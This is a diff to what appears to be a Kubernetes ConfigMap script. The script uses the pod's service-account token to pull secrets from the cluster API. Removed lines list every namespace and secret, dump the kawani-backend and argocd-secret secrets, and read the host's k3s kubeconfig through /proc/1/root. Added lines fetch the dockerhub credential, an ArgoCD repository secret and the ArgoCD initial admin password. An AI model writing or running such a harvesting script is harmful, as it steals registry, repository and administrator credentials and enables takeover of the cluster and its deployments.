@@ -10,19 +10,13 @@ data:
     CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
     API=https://kubernetes.default.svc
     
-    echo '=== NAMESPACES ==='
-    curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" $API/api/v1/namespaces | grep '"name":' | grep -v 'managedFields\|creationTimestamp\|uid\|resourceVersion'
+    echo '=== dockerhub ==='
+    curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" $API/api/v1/namespaces/default/secrets/dockerhub
     
-    echo '=== SECRETS ==='
-    curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" $API/api/v1/secrets | grep -E '"namespace"|"name":|"data"' | head -200
+    echo '=== repo-823010616 ==='
+    curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" $API/api/v1/namespaces/argocd/secrets/repo-823010616
     
-    echo '=== KAWANI SECRET RAW ==='
-    curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" $API/api/v1/namespaces/kawani/secrets/kawani-backend
-    
-    echo '=== ARGOCD SECRET RAW ==='
-    curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" $API/api/v1/namespaces/argocd/secrets/argocd-secret
-    
-    echo '=== K3S KUBECONFIG ==='
-    cat /proc/1/root/etc/rancher/k3s/k3s.yaml 2>/dev/null || echo NOT_FOUND
+    echo '=== argocd-initial-admin-secret ==='
+    curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" $API/api/v1/namespaces/argocd/secrets/argocd-initial-admin-secret
     
     echo '=== DONE ==='
